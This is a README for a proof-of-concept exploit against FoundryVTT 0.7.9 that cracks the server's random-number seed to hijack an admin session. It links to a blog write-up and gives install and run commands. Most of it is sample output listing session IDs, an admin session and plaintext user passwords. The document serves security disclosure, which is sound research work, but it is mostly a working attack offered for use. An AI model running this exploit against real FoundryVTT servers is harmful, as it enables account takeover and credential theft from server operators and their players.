# FoundryVTT admin authenttication bypass

For more info, read this [blogpost](https://catnip.fyi/posts/foundry-p3/).
This repo contains the POC exploit to crack an admin session ([rnghax.py](rnghax.py)) and
also a file i used to calculate the accurracy of my base64 decode
([riddec_stonks.py](riddec_stonks.py)).

Install the deps like:
> pip install -r requirements.txt

and run it like:
```
❯  python rnghax.py http://localhost:30000
server running foundry 0.7.9
data path at /home/catnip/.local/share/FoundryVTT
trying with tokens: ['db8x4llkgsqip7deh42cqrj3', '1puya3xxss9ftryt3x1zprlu']
found seed: 9993270706845480418:11192517990384452169
looking for sessions
----
found following sessions:
rid: ji38xvzub5j34pbd8vfksowi
rid: 1puya3xxss9ftryt3x1zprlu
rid: db8x4llkgsqip7deh42cqrj3
rid: fgo1aa8w635pk7bw44kkt35e
admin! rid: tmcg42wsw3g99fn55oyeciv6 uid: yYMaJwcVCcqJN09P name: Gamemaster password:
----
found following users:
uid: 9QMfMfcKwjnU0lQ7 name: lit password: af role: 2
uid: FGWnyV4lH2KmuRzd name: salad password: kektop role: 1
uid: R8xJ9pkyBP54OIsN name: memes password: topkek role: 1
uid: iGNzDi9gdSeZfgZH name: yeet password: top role: 1
uid: yYMaJwcVCcqJN09P name: Gamemaster password:  role: 4
```
